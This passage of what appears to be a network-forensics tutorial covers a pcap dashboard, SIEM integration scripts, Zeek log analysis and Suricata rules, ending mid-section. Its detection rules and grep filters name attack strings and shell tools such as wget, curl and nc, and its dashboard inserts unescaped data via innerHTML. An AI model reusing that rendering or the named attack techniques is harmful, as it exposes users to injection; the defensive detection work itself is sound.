                    `<p style="color: red;">Error: ${error}</p>`;
            });
        }
        
        function checkStatus() {
            if (!currentPcapId) return;
            
            fetch(`/api/status/${currentPcapId}`)
            .then(response => response.json())
            .then(data => {
                const statusClass = `status-${data.status}`;
                document.getElementById('status').innerHTML = 
                    `<p>Status: <span class="status ${statusClass}">${data.status.toUpperCase()}</span></p>` +
                    `<p>Progress: ${data.progress} packets</p>`;
                
                if (data.status === 'completed') {
                    clearInterval(statusCheckInterval);
                    getResults();
                }
            });
        }
        
        function getResults() {
            fetch(`/api/results/${currentPcapId}`)
            .then(response => response.json())
            .then(data => {
                displayResults(data);
            });
        }
        
        function displayResults(data) {
            let html = '<h2>Analysis Results</h2>';
            
            // Metrics
            html += '<div class="metrics">';
            html += `<div class="metric">
                        <div class="metric-value">${data.total_packets}</div>
                        <div class="metric-label">Total Packets</div>
                     </div>`;
            html += `<div class="metric">
                        <div class="metric-value">${Object.keys(data.conversations).length}</div>
                        <div class="metric-label">Conversations</div>
                     </div>`;
            html += `<div class="metric">
                        <div class="metric-value">${Object.keys(data.protocols).length}</div>
                        <div class="metric-label">Protocols</div>
                     </div>`;
            html += '</div>';
            
            // Top Conversations
            html += '<h3>Top Conversations</h3><table>';
            html += '<tr><th>Conversation</th><th>Packets</th></tr>';
            for (const [conv, count] of Object.entries(data.conversations).slice(0, 10)) {
                html += `<tr><td>${conv}</td><td>${count}</td></tr>`;
            }
            html += '</table>';
            
            // Protocol Distribution
            html += '<h3>Protocol Distribution</h3><table>';
            html += '<tr><th>Protocol</th><th>Count</th></tr>';
            for (const [proto, count] of Object.entries(data.protocols)) {
                html += `<tr><td>${proto}</td><td>${count}</td></tr>`;
            }
            html += '</table>';
            
            // Action buttons
            html += '<h3>Extract Data</h3>';
            html += '<button onclick="extractDNS()">Extract DNS Queries</button> ';
            html += '<button onclick="extractHTTP()">Extract HTTP Requests</button>';
            
            document.getElementById('results').innerHTML = html;
        }
        
        function extractDNS() {
            fetch(`/api/extract/dns/${currentPcapId}`)
            .then(response => response.json())
            .then(data => {
                let html = '<h3>DNS Queries</h3><table>';
                html += '<tr><th>Query</th><th>Source</th><th>Timestamp</th></tr>';
                data.dns_queries.forEach(q => {
                    html += `<tr><td>${q.query}</td><td>${q.source}</td><td>${q.timestamp}</td></tr>`;
                });
                html += '</table>';
                document.getElementById('results').innerHTML += html;
            });
        }
        
        function extractHTTP() {
            fetch(`/api/extract/http/${currentPcapId}`)
            .then(response => response.json())
            .then(data => {
                let html = '<h3>HTTP Requests</h3><table>';
                html += '<tr><th>Method</th><th>Host</th><th>URI</th><th>Source</th></tr>';
                data.http_requests.forEach(r => {
                    html += `<tr><td>${r.method}</td><td>${r.host}</td><td>${r.uri}</td><td>${r.source}</td></tr>`;
                });
                html += '</table>';
                document.getElementById('results').innerHTML += html;
            });
        }
    </script>
</body>
</html>
```

**Run the Dashboard:**

```bash
# Install dependencies
pip3 install flask flask-cors pyshark

# Create templates directory
mkdir -p templates
# Save HTML to templates/dashboard.html

# Run server
python3 flask_dashboard.py

# Access at http://localhost:5000
```

### Integration Scripts

**Splunk Integration:**

```bash
#!/bin/bash
# Send tshark analysis to Splunk HEC (HTTP Event Collector)

PCAP="$1"
SPLUNK_HEC_URL="https://splunk.example.com:8088/services/collector"
SPLUNK_HEC_TOKEN="your-hec-token-here"

echo "[*] Analyzing $PCAP and sending to Splunk..."

# Extract events and send to Splunk
tshark -r "$PCAP" -T json -e frame.time -e ip.src -e ip.dst -e _ws.col.Protocol 2>/dev/null | \
jq -c '.[]' | \
while read event; do
    # Wrap in Splunk HEC format
    splunk_event=$(jq -n \
      --argjson event "$event" \
      '{
        "event": $event,
        "sourcetype": "pcap_analysis",
        "source": "tshark",
        "index": "network"
      }')
    
    # Send to Splunk
    curl -k -X POST "$SPLUNK_HEC_URL" \
      -H "Authorization: Splunk $SPLUNK_HEC_TOKEN" \
      -H "Content-Type: application/json" \
      -d "$splunk_event"
done

echo "[+] Events sent to Splunk"
```

**Elasticsearch Integration:**

```python
#!/usr/bin/env python3
"""
Send PCAP analysis results to Elasticsearch
"""

from elasticsearch import Elasticsearch
import pyshark
import json
from datetime import datetime

# Elasticsearch configuration
ES_HOST = "localhost:9200"
ES_INDEX = "network-traffic"

def send_to_elasticsearch(pcap_file):
    """Send packet data to Elasticsearch"""
    
    es = Elasticsearch([ES_HOST])
    
    cap = pyshark.FileCapture(pcap_file)
    
    for packet in cap:
        try:
            doc = {
                '@timestamp': packet.sniff_timestamp,
                'protocol': packet.highest_layer if hasattr(packet, 'highest_layer') else 'unknown',
                'length': packet.length
            }
            
            if hasattr(packet, 'ip'):
                doc['src_ip'] = packet.ip.src
                doc['dst_ip'] = packet.ip.dst
            
            if hasattr(packet, 'tcp'):
                doc['src_port'] = packet.tcp.srcport
                doc['dst_port'] = packet.tcp.dstport
                doc['transport'] = 'tcp'
            elif hasattr(packet, 'udp'):
                doc['src_port'] = packet.udp.srcport
                doc['dst_port'] = packet.udp.dstport
                doc['transport'] = 'udp'
            
            # Index document
            es.index(index=ES_INDEX, document=doc)
            
        except AttributeError:
            continue
    
    cap.close()
    print(f"[+] Sent data to Elasticsearch index: {ES_INDEX}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: ./es_integration.py <pcap_file>")
        sys.exit(1)
    
    send_to_elasticsearch(sys.argv[1])
```

This comprehensive scripting and automation section provides production-ready tools for network traffic analysis, from basic tshark automation to advanced custom tool development with web dashboards and SIEM integration.

---

# Log Analysis & Correlation

## Zeek (Bro) IDS Logs

### Zeek Architecture and Log Types

**Core Zeek Log Files:**

```
conn.log       - Connection summaries (TCP/UDP/ICMP)
dns.log        - DNS queries and responses
http.log       - HTTP requests and responses
ssl.log        - SSL/TLS handshake information
files.log      - File transfers across protocols
weird.log      - Protocol anomalies and violations
notice.log     - Security alerts and notifications
intel.log      - Intelligence framework matches
x509.log       - Certificate information
dhcp.log       - DHCP transactions
smtp.log       - Email traffic
ftp.log        - FTP commands and responses
ssh.log        - SSH connection details
rdp.log        - RDP connections
smb_files.log  - SMB file operations
kerberos.log   - Kerberos authentication
```

### Installing and Running Zeek

**Installation on Kali Linux:**

```bash
# Install from repositories
apt update && apt install zeek

# Or install from source for latest version
git clone --recursive https://github.com/zeek/zeek
cd zeek
./configure
make
sudo make install

# Add to PATH
export PATH=/opt/zeek/bin:$PATH
echo 'export PATH=/opt/zeek/bin:$PATH' >> ~/.bashrc

# Verify installation
zeek --version
```

**Processing PCAP Files:**

```bash
# Basic PCAP analysis
zeek -r capture.pcap

# Specify output directory
zeek -r capture.pcap -C

# Use specific scripts
zeek -r capture.pcap protocols/http/detect-sqli

# Load custom script
zeek -r capture.pcap custom_script.zeek

# Generate logs in JSON format
zeek -r capture.pcap LogAscii::use_json=T

# Process with specific policy
zeek -r capture.pcap policy/frameworks/intel/seen

# Suppress stdout output
zeek -r capture.pcap 2>&1 | grep -v "listening on"
```

**Live Capture:**

```bash
# Monitor interface
zeek -i eth0

# Monitor with specific scripts
zeek -i eth0 protocols/http/detect-sqli protocols/ssl/validate-certs

# Daemonize Zeek
zeekctl deploy

# Check status
zeekctl status

# Rotate logs
zeekctl cron
```

### Analyzing conn.log

**conn.log Structure:**

```
ts          - Timestamp
uid         - Unique connection ID
id.orig_h   - Source IP
id.orig_p   - Source port
id.resp_h   - Destination IP
id.resp_p   - Destination port
proto       - Protocol (tcp/udp/icmp)
service     - Detected service
duration    - Connection duration
orig_bytes  - Bytes from originator
resp_bytes  - Bytes from responder
conn_state  - Connection state
local_orig  - Is originator local
local_resp  - Is responder local
missed_bytes- Lost bytes
history     - Connection state history
orig_pkts   - Packets from originator
orig_ip_bytes - IP bytes from originator
resp_pkts   - Packets from responder
resp_ip_bytes - IP bytes from responder
```

**Connection State Analysis:**

```bash
# Extract connection states
cat conn.log | zeek-cut id.orig_h id.resp_h conn_state | sort | uniq -c | sort -rn

# Connection states meaning:
# S0 - Attempted connection, no reply
# S1 - Connection established, no data
# SF - Normal connection close
# REJ - Connection rejected
# S2 - Connection established and closed properly
# S3 - Connection established, originator aborted
# RSTO - Connection reset by originator
# RSTR - Connection reset by responder
# RSTOS0 - Originator sent SYN, responder sent RST
# OTH - Other state

# Find port scans (many S0 states from single source)
cat conn.log | zeek-cut id.orig_h conn_state | grep "S0" | sort | uniq -c | sort -rn | head -20

# Identify failed connections
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p conn_state | grep -E "S0|REJ|RSTO" | head -50

# Long-duration connections (potential C2)
cat conn.log | zeek-cut ts duration id.orig_h id.resp_h id.resp_p | awk '$2 > 3600' | sort -k2 -rn

# High byte transfer connections
cat conn.log | zeek-cut id.orig_h id.resp_h orig_bytes resp_bytes | awk '$3 > 10000000 || $4 > 10000000'

# Connections without service detection (potentially malicious)
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p service | grep "-" | head -50

# Asymmetric connections (potential data exfiltration)
cat conn.log | zeek-cut id.orig_h id.resp_h orig_bytes resp_bytes | awk '$3 > $4 * 10'
```

**Traffic Pattern Analysis:**

```bash
# Top talkers by connection count
cat conn.log | zeek-cut id.orig_h | sort | uniq -c | sort -rn | head -20

# Top destinations
cat conn.log | zeek-cut id.resp_h | sort | uniq -c | sort -rn | head -20

# Top services
cat conn.log | zeek-cut service | grep -v "-" | sort | uniq -c | sort -rn

# Connections by protocol
cat conn.log | zeek-cut proto | sort | uniq -c

# Port distribution
cat conn.log | zeek-cut id.resp_p | sort | uniq -c | sort -rn | head -30

# Internal to internal connections (lateral movement)
cat conn.log | zeek-cut id.orig_h id.resp_h | awk '$1 ~ /^192\.168\./ && $2 ~ /^192\.168\./'

# External connections from internal hosts
cat conn.log | zeek-cut id.orig_h id.resp_h | awk '$1 ~ /^192\.168\./ && $2 !~ /^(192\.168\.|10\.|172\.16\.)/'
```

### Analyzing dns.log

**dns.log Structure:**

```
ts          - Timestamp
uid         - Connection UID
id.orig_h   - Client IP
id.resp_h   - DNS server IP
proto       - Protocol (udp/tcp)
trans_id    - DNS transaction ID
query       - Domain queried
qclass      - Query class
qclass_name - Query class name
qtype       - Query type (A, AAAA, MX, etc.)
qtype_name  - Query type name
rcode       - Response code
rcode_name  - Response code name
AA          - Authoritative answer
TC          - Truncated
RD          - Recursion desired
RA          - Recursion available
Z           - Reserved
answers     - List of answers
TTLs        - TTL values
rejected    - Query rejected
```

**DNS Analysis Queries:**

```bash
# Top queried domains
cat dns.log | zeek-cut query | sort | uniq -c | sort -rn | head -50

# Failed DNS queries (NXDOMAIN)
cat dns.log | zeek-cut ts id.orig_h query rcode_name | grep "NXDOMAIN"

# Long domain names (potential DNS tunneling)
cat dns.log | zeek-cut query | awk 'length($0) > 50'

# Suspicious TLDs
cat dns.log | zeek-cut query | grep -E "\.(xyz|top|tk|ml|ga|cf|gq)$" | sort -u

# High entropy domains (DGA detection)
cat dns.log | zeek-cut query | awk -F'.' '{print $(NF-1)"."$NF}' | sort | uniq -c | sort -rn

# TXT record queries (potential C2 or data exfil)
cat dns.log | zeek-cut query qtype_name | grep "TXT"

# Subdomain enumeration detection
cat dns.log | zeek-cut query | awk -F'.' '{print $(NF-1)"."$NF}' | sort | uniq -c | awk '$1 > 100'

# Base64 in DNS queries
cat dns.log | zeek-cut query | grep -E "[A-Za-z0-9+/=]{20,}\."

# Numeric subdomains (potential tunneling)
cat dns.log | zeek-cut query | grep -E "^[0-9]+"

# DNS response times (delays may indicate tunneling)
cat dns.log | zeek-cut ts id.orig_h query | awk '{if(NR>1) print $1-prev_ts, $2, $3; prev_ts=$1}'
```

**DGA Detection:**

```bash
# Calculate domain entropy (requires script)
cat dns.log | zeek-cut query | while read domain; do
    echo -n "$domain "
    echo -n "$domain" | grep -o . | sort | uniq -c | \
    awk '{freq=$1/length("'"$domain"'"); if(freq>0) entropy-=freq*log(freq)/log(2)} END {print entropy}'
done | awk '$2 > 3.5'  # High entropy threshold

# Identify domains with random patterns
cat dns.log | zeek-cut query | grep -E "[a-z]{10,}\.(com|net|org)$"

# Check against known DGA families
cat dns.log | zeek-cut query | grep -iE "(conficker|zeus|cryptolocker|locky|dyre)"
```

### Analyzing http.log

**http.log Structure:**

```
ts              - Timestamp
uid             - Connection UID
id.orig_h       - Client IP
id.resp_h       - Server IP
trans_depth     - Transaction depth
method          - HTTP method
host            - Hostname
uri             - Request URI
referrer        - HTTP referrer
version         - HTTP version
user_agent      - User agent string
request_body_len - Request body length
response_body_len - Response body length
status_code     - HTTP status code
status_msg      - Status message
info_code       - Informational code
info_msg        - Informational message
tags            - Analysis tags
username        - Username (if auth)
password        - Password (if auth)
proxied         - Proxied hosts
orig_fuids      - File UIDs from originator
resp_fuids      - File UIDs from responder
resp_mime_types - MIME types in response
```

**HTTP Traffic Analysis:**

```bash
# Top requested URLs
cat http.log | zeek-cut host uri | sort | uniq -c | sort -rn | head -50

# POST requests (potential data upload)
cat http.log | zeek-cut ts id.orig_h method host uri request_body_len | grep "POST"

# Large POST requests
cat http.log | zeek-cut method host uri request_body_len | awk '$1=="POST" && $4 > 10000'

# User agent analysis
cat http.log | zeek-cut user_agent | sort | uniq -c | sort -rn

# Suspicious user agents (scanners, tools)
cat http.log | zeek-cut user_agent | grep -iE "(nikto|nmap|sqlmap|burp|masscan|metasploit|python|curl|wget)"

# HTTP status code distribution
cat http.log | zeek-cut status_code | sort | uniq -c | sort -rn

# Client errors (4xx)
cat http.log | zeek-cut ts id.orig_h host uri status_code | awk '$5 >= 400 && $5 < 500'

# Server errors (5xx)
cat http.log | zeek-cut ts id.orig_h host uri status_code | awk '$5 >= 500'

# Potential SQL injection attempts
cat http.log | zeek-cut uri | grep -iE "(union.*select|insert.*into|'.*or.*1=1)"

# XSS attempts
cat http.log | zeek-cut uri | grep -iE "(<script|javascript:|onerror=|onload=)"

# Directory traversal attempts
cat http.log | zeek-cut uri | grep -E "(\.\.\/|\.\.\\\\|%2e%2e)"

# Admin panel access
cat http.log | zeek-cut host uri | grep -iE "(admin|phpmyadmin|wp-admin|manager|console)"

# Executable downloads
cat http.log | zeek-cut host uri resp_mime_types | grep -E "\.(exe|dll|bat|ps1|sh)"

# Credentials in URLs (security issue)
cat http.log | zeek-cut uri | grep -E "(password=|pwd=|pass=|user=|username=)"
```

**HTTP Method Analysis:**

```bash
# Method distribution
cat http.log | zeek-cut method | sort | uniq -c | sort -rn

# Unusual methods (potential attacks)
cat http.log | zeek-cut method | grep -vE "(GET|POST|HEAD|OPTIONS)" | sort -u

# PUT/DELETE requests (potential file manipulation)
cat http.log | zeek-cut ts id.orig_h method host uri | grep -E "(PUT|DELETE)"

# TRACE method (XST vulnerability)
cat http.log | zeek-cut method | grep "TRACE"
```

### Analyzing ssl.log

**ssl.log Structure:**

```
ts              - Timestamp
uid             - Connection UID
id.orig_h       - Client IP
id.resp_h       - Server IP
version         - SSL/TLS version
cipher          - Cipher suite
curve           - Elliptic curve
server_name     - SNI hostname
resumed         - Session resumed
last_alert      - Last alert
next_protocol   - Next protocol (ALPN)
established     - Connection established
cert_chain_fuids - Certificate chain file UIDs
client_cert_chain_fuids - Client cert chain
subject         - Certificate subject
issuer          - Certificate issuer
client_subject  - Client cert subject
client_issuer   - Client cert issuer
validation_status - Cert validation status
```

**SSL/TLS Analysis:**

```bash
# TLS version distribution
cat ssl.log | zeek-cut version | sort | uniq -c | sort -rn

# Weak TLS versions (SSL 2.0, SSL 3.0, TLS 1.0, TLS 1.1)
cat ssl.log | zeek-cut ts id.orig_h server_name version | grep -E "(SSLv|TLSv10|TLSv11)"

# Cipher suite analysis
cat ssl.log | zeek-cut cipher | sort | uniq -c | sort -rn

# Weak ciphers
cat ssl.log | zeek-cut server_name cipher | grep -iE "(NULL|EXPORT|DES|RC4|MD5)"

# Self-signed certificates
cat ssl.log | zeek-cut server_name subject issuer | awk '$2 == $3'

# Certificate validation failures
cat ssl.log | zeek-cut ts server_name validation_status | grep -v "ok"

# SNI analysis (domains accessed)
cat ssl.log | zeek-cut server_name | sort | uniq -c | sort -rn | head -50

# Suspicious SNI domains
cat ssl.log | zeek-cut server_name | grep -iE "(malware|phishing|suspicious)"

# Certificate subject analysis
cat ssl.log | zeek-cut subject | grep "CN=" | cut -d',' -f1 | sort -u

# JA3 fingerprinting (if enabled)
cat ssl.log | zeek-cut ja3 | sort | uniq -c | sort -rn

# TLS on non-standard ports
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p service | grep "ssl" | awk '$3 != 443'
```

### Analyzing files.log

**files.log Structure:**

```
ts              - Timestamp
fuid            - File UID
tx_hosts        - Transfer hosts (source)
rx_hosts        - Receiving hosts
conn_uids       - Connection UIDs
source          - Detection source
depth           - Depth in protocol
analyzers       - File analyzers used
mime_type       - MIME type
filename        - Filename (if available)
duration        - Duration of transfer
local_orig      - Local originator
is_orig         - File from originator
seen_bytes      - Bytes seen
total_bytes     - Total bytes (if known)
missing_bytes   - Missing bytes
overflow_bytes  - Overflow bytes
timedout        - Transfer timed out
parent_fuid     - Parent file UID
md5             - MD5 hash
sha1            - SHA1 hash
sha256          - SHA256 hash
extracted       - File extracted
```

**File Transfer Analysis:**

```bash
# File type distribution
cat files.log | zeek-cut mime_type | sort | uniq -c | sort -rn

# Executable transfers
cat files.log | zeek-cut tx_hosts rx_hosts mime_type filename | grep -E "(application/x-dosexec|application/x-executable|application/x-msdos-program)"

# Large file transfers
cat files.log | zeek-cut tx_hosts rx_hosts filename seen_bytes | awk '$4 > 10000000'

# Files by hash
cat files.log | zeek-cut mime_type md5 sha256 | grep -v "-"

# Office document transfers
cat files.log | zeek-cut tx_hosts rx_hosts filename mime_type | grep -E "(msword|officedocument|excel|powerpoint)"

# Archive transfers
cat files.log | zeek-cut tx_hosts rx_hosts filename mime_type | grep -E "(zip|rar|7z|tar|gzip)"

# Script file transfers
cat files.log | zeek-cut tx_hosts rx_hosts filename mime_type | grep -E "(javascript|x-sh|x-python|x-perl)"

# Suspicious filenames
cat files.log | zeek-cut filename | grep -iE "(payload|shell|exploit|crack|hack)"

# Files with mismatched extensions and MIME types
cat files.log | zeek-cut filename mime_type | awk -F'\t' '$1 ~ /\.jpg$/ && $2 !~ /image/'
```

### Analyzing weird.log

**Protocol Anomalies:**

```bash
# Anomaly type distribution
cat weird.log | zeek-cut name | sort | uniq -c | sort -rn

# Common anomalies and meanings:
# line_terminated_with_single_CR - Malformed HTTP
# excessive_data_without_further_headers - Potential exploit
# truncated_header - Protocol violation
# fragment_with_DF - IP fragmentation issue
# bad_TCP_checksum - Network or attack artifact

# Anomalies by source
cat weird.log | zeek-cut id.orig_h name | sort | uniq -c | sort -rn | head -20

# Specific anomaly details
cat weird.log | zeek-cut ts id.orig_h id.resp_h name notice | grep "excessive_data"

# Multiple anomalies from same source (potential attack)
cat weird.log | zeek-cut id.orig_h | sort | uniq -c | awk '$1 > 10' | sort -rn
```

### Analyzing notice.log

**Security Notices:**

```bash
# Notice type distribution
cat notice.log | zeek-cut note | sort | uniq -c | sort -rn

# Common notice types:
# Scan::Port_Scan - Port scanning detected
# HTTP::SQL_Injection_Attacker - SQL injection attempt
# Intel::Notice - Intelligence match
# SSH::Password_Guessing - SSH brute force
# SSL::Invalid_Server_Cert - Invalid certificate

# High-severity notices
cat notice.log | zeek-cut ts src dst note msg | grep -E "(Scan|Attack|Exploit)"

# Intelligence hits
cat intel.log | zeek-cut ts uid id.orig_h id.resp_h seen.indicator matched

# SSH brute force attempts
cat notice.log | zeek-cut ts src note msg | grep "SSH::Password_Guessing"

# Scan detection
cat notice.log | zeek-cut ts src dst note | grep "Scan::"
```

### Zeek Scripting for Custom Analysis

**Basic Zeek Script Structure:**

```zeek
# custom_analysis.zeek

# Define event handlers
event http_request(c: connection, method: string, original_URI: string,
                   unescaped_URI: string, version: string)
{
    # Detect SQL injection
    if (/union.*select|insert.*into/ in unescaped_URI)
    {
        print fmt("Potential SQLi from %s to %s: %s", 
                  c$id$orig_h, c$id$resp_h, unescaped_URI);
    }
    
    # Detect directory traversal
    if (/\.\.\/|\.\.\\/ in unescaped_URI)
    {
        print fmt("Directory traversal attempt from %s: %s",
                  c$id$orig_h, unescaped_URI);
    }
}

# Monitor long connections
event connection_state_remove(c: connection)
{
    if (c$duration > 3600 secs)
    {
        print fmt("Long connection: %s -> %s:%d (duration: %s)",
                  c$id$orig_h, c$id$resp_h, c$id$resp_p, c$duration);
    }
}
```

**Loading Custom Scripts:**

```bash
# Run with custom script
zeek -r capture.pcap custom_analysis.zeek

# Multiple scripts
zeek -r capture.pcap script1.zeek script2.zeek

# From scripts directory
zeek -r capture.pcap scripts/__load__.zeek
```

### Zeek Log Correlation

**Cross-Log Analysis:**

```bash
# Correlate HTTP and DNS logs by UID
join -1 2 -2 2 <(cat http.log | zeek-cut uid host | sort -k1) \
                <(cat dns.log | zeek-cut uid query | sort -k1)

# Find connections for specific file transfer
fuid="FAbcdef123"
cat conn.log | zeek-cut uid id.orig_h id.resp_h | \
    grep -f <(cat files.log | zeek-cut conn_uids | grep "$fuid")

# Correlate SSL and HTTP by IP and time window
cat ssl.log | zeek-cut ts id.orig_h id.resp_h server_name > ssl_temp.txt
cat http.log | zeek-cut ts id.orig_h id.resp_h host > http_temp.txt
join -1 2,3 -2 2,3 ssl_temp.txt http_temp.txt

# Timeline reconstruction
cat conn.log | zeek-cut ts id.orig_h id.resp_h id.resp_p service | sort -k1 > timeline.txt
```

### Automated Zeek Analysis Scripts

**Analysis Automation:**

```bash
#!/bin/bash
# zeek_analysis.sh - Automated Zeek log analysis

LOGDIR="."

echo "=== Top Talkers ==="
cat $LOGDIR/conn.log | zeek-cut id.orig_h | sort | uniq -c | sort -rn | head -10

echo -e "\n=== Port Scan Detection ==="
cat $LOGDIR/conn.log | zeek-cut id.orig_h conn_state | grep "S0" | \
    sort | uniq -c | awk '$1 > 50' | sort -rn

echo -e "\n=== DNS Tunneling Suspects ==="
cat $LOGDIR/dns.log | zeek-cut query | awk 'length($0) > 50' | head -20

echo -e "\n=== Suspicious User Agents ==="
cat $LOGDIR/http.log | zeek-cut user_agent | \
    grep -iE "(nikto|nmap|sqlmap|python|curl)" | sort -u

echo -e "\n=== Weak TLS Versions ==="
cat $LOGDIR/ssl.log | zeek-cut server_name version | \
    grep -E "(SSLv|TLSv10|TLSv11)" | sort -u

echo -e "\n=== Executable Downloads ==="
cat $LOGDIR/files.log | zeek-cut tx_hosts rx_hosts filename mime_type | \
    grep -E "(x-dosexec|x-executable)"

echo -e "\n=== Security Notices ==="
cat $LOGDIR/notice.log | zeek-cut ts src dst note msg
```

---

## Suricata Rule Analysis

### Suricata Installation and Configuration

**Installing Suricata:**

```bash
# Install on Kali
apt update && apt install suricata

# Or from PPA (Ubuntu/Debian)
add-apt-repository ppa:oisf/suricata-stable
apt update && apt install suricata

# Verify installation
suricata --build-info

# Update rulesets
suricata-update

# List available sources
suricata-update list-sources

# Enable specific source
suricata-update enable-source et/open
suricata-update enable-source oisf/trafficid
```

**Basic Configuration:**

```bash
# Configuration file location
/etc/suricata/suricata.yaml

# Key configuration sections:
# - vars: Network variables (HOME_NET, EXTERNAL_NET)
# - default-rule-path: Rule file location
# - rule-files: List of rule files to load
# - outputs: Logging configuration

# Edit configuration
sudo nano /etc/suricata/suricata.yaml

# Set HOME_NET
vars:
  address-groups:
    HOME_NET: "[192.168.0.0/16,10.0.0.0/8,172.16.0.0/12]"
    EXTERNAL_NET: "!$HOME_NET"
```

### Running Suricata

**PCAP Analysis:**

```bash
# Basic PCAP analysis
suricata -r capture.pcap

# Specify configuration file
suricata -c /etc/suricata/suricata.yaml -r capture.pcap

# Specify log directory
suricata -r capture.pcap -l /var/log/suricata/

# With specific ruleset
suricata -r capture.pcap -S custom.rules

# Verbose output
suricata -r capture.pcap -v

# Very verbose (debug)
suricata -r capture.pcap -vv
```

**Live Capture:**

```bash
# Monitor interface
suricata -i eth0

# With specific configuration
suricata -c /etc/suricata/suricata.yaml -i eth0

# AF_PACKET mode (better performance)
suricata --af-packet=eth0

# Run as daemon
suricata -D -i eth0

# Check if running
ps aux | grep suricata
```

### Suricata Rule Syntax

**Rule Structure:**

```
action protocol src_ip src_port direction dst_ip dst_port (rule options)

Components:
- action: alert, pass, drop, reject, rejectsrc, rejectdst, rejectboth
- protocol: tcp, udp, icmp, ip, http, ftp, tls, smb, dns, ssh
- src_ip: Source IP or variable ($HOME_NET, any, !192.168.0.0/16)
- src_port: Source port (any, 80, 1024:65535, [80,443,8080])
- direction: -> (unidirectional), <> (bidirectional)
- dst_ip: Destination IP
- dst_port: Destination port
- rule options: Detection criteria and metadata
```

**Basic Rule Examples:**

```bash
# Detect HTTP traffic to specific IP
alert tcp any any -> 203.0.113.50 80 (msg:"HTTP to suspicious IP"; sid:1000001; rev:1;)

# Detect SQL injection in HTTP
alert http any any -> $HOME_NET any (msg:"SQL Injection Attempt"; \
    content:"union"; nocase; content:"select"; nocase; distance:0; \
    classtype:web-application-attack; sid:1000002; rev:1;)

# Detect SSH brute force
alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"SSH Brute Force Attempt"; \
    flags:S; threshold:type both, track by_src, count 10, seconds 60; \
    classtype:attempted-admin; sid:1000003; rev:1;)

# Detect port scan
alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"Port Scan Detected"; \
    flags:S; threshold:type both, track by_src, count 20, seconds 10; \
    classtype:attempted-recon; sid:1000004; rev:1;)

# Detect large data transfer
alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"Large Outbound Transfer"; \
    dsize:>1000000; threshold:type limit, track by_src, count 1, seconds 60; \
    classtype:policy-violation; sid:1000005; rev:1;)
```

### Rule Options and Keywords

**Content Matching:**

```bash
# Basic content match
alert http any any -> any any (msg:"Admin Access"; content:"admin"; sid:1;)

# Case-insensitive
alert http any any -> any any (msg:"Login"; content:"login"; nocase; sid:2;)

# Multiple content matches (AND condition)
alert http any any -> any any (msg:"SQL Injection"; \
    content:"union"; nocase; content:"select"; nocase; sid:3;)

# Content with offset
alert http any any -> any any (msg:"Specific Pattern"; \
    content:"POST"; offset:0; depth:4; sid:4;)

# Content distance and within
alert http any any -> any any (msg:"Chained Pattern"; \
    content:"username"; content:"="; distance:0; within:1; \
    content:"admin"; distance:0; within:10; sid:5;)

# Negation
alert http any any -> any any (msg:"Not GET"; \
    content:!"GET"; offset:0; depth:3; sid:6;)

# Binary content (hex)
alert tcp any any -> any any (msg:"PE Header"; \
    content:"|4D 5A|"; offset:0; depth:2; sid:7;)
```

**PCRE (Perl Compatible Regular Expressions):**

```bash
# Basic regex
alert http any any -> any any (msg:"Email in HTTP"; \
    pcre:"/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/i"; sid:10;)

# SQL injection pattern
alert http any any -> any any (msg:"SQLi Pattern"; \
    pcre:"/union.*select|insert.*into/i"; sid:11;)

# XSS pattern
alert http any any -> any any (msg:"XSS Attempt"; \
    pcre:"/<script|javascript:|onerror=|onload=/i"; sid:12;)

# Base64 detection
alert http any any -> any any (msg:"Base64 Encoded Data"; \
    pcre:"/[A-Za-z0-9+\/=]{40,}/"; sid:13;)

# Command injection
alert http any any -> any any (msg:"Command Injection"; \
    pcre:"/;.*?(cat|wget|curl|bash|sh|nc|netcat)/i"; sid:14;)
```

**Protocol-Specific Keywords:**

```bash
# HTTP keywords
alert http any any -> any any (msg:"POST to upload"; \
    http.method; content:"POST"; http.uri; content:"/upload"; sid:20;)

alert http any any -> any any (msg:"Suspicious User-Agent"; \
    http.user_agent; content:"sqlmap"; nocase; sid:21;)

alert http any any -> any any (msg:"Large Cookie"; \
    http.cookie; dsize:>1000; sid:22;)

alert http any any -> any any (msg:"PHP in User-Agent"; \
    http.user_agent; content:"PHP"; sid:23;)

alert http any any -> any any (msg:"Admin in Host"; \
    http.host; content:"admin"; nocase; sid:24;)

# DNS keywords
alert dns any any -> any any (msg:"Long DNS Query"; \
    dns.query; content_len:>50; sid:30;)

alert dns any any -> any any (msg:"Suspicious TLD";  
dns.query; content:".tk"; endswith; sid:31;)

alert dns any any -> any any (msg:"TXT Record Query";  
dns.query; content:"|00 10|"; sid:32;)

# TLS/SSL keywords

alert tls any any -> any any (msg:"Weak TLS Version";  
tls.version:1.0; sid:40;)

alert tls any any -> any any (msg:"Self-Signed Certificate";  
tls.cert_subject; content:"CN=";  
tls.cert_issuer; content:"CN="; sid:41;)

alert tls any any -> any any (msg:"Suspicious SNI";  
tls.sni; content:"malware"; nocase; sid:42;)

# SSH keywords

alert ssh any any -> any any (msg:"SSH Version Banner";  
ssh.protoversion; content:"2.0"; sid:50;)

alert ssh any any -> any any (msg:"SSH Software Detection";  
ssh.softwareversion; content:"OpenSSH"; sid:51;)

# SMB keywords

alert smb any any -> any any (msg:"SMB Admin Share Access";  
smb.named_pipe; content:"IPC$"; sid:60;)

alert smb any any -> any any (msg:"SMB Executable Transfer";  
smb.ntlmssp_user; fileext:"exe"; sid:61;)

````

**Flow and Stream Keywords:**

```bash
# Flow direction
alert tcp any any -> any any (msg:"Outbound Connection"; \
    flow:to_server; sid:70;)

alert tcp any any -> any any (msg:"Server Response"; \
    flow:to_client; sid:71;)

# Established connections only
alert tcp any any -> any any (msg:"Established Traffic"; \
    flow:established; sid:72;)

# New connections
alert tcp any any -> any any (msg:"New Connection"; \
    flow:not_established; sid:73;)

# Stream size
alert tcp any any -> any any (msg:"Large Stream"; \
    stream_size:server,>,10000000; sid:74;)
````

**Threshold and Suppression:**

```bash
# Threshold - limit alerts
alert tcp any any -> any any (msg:"Rate Limited Alert"; \
    threshold:type limit, track by_src, count 1, seconds 60; sid:80;)

# Threshold - alert after X occurrences
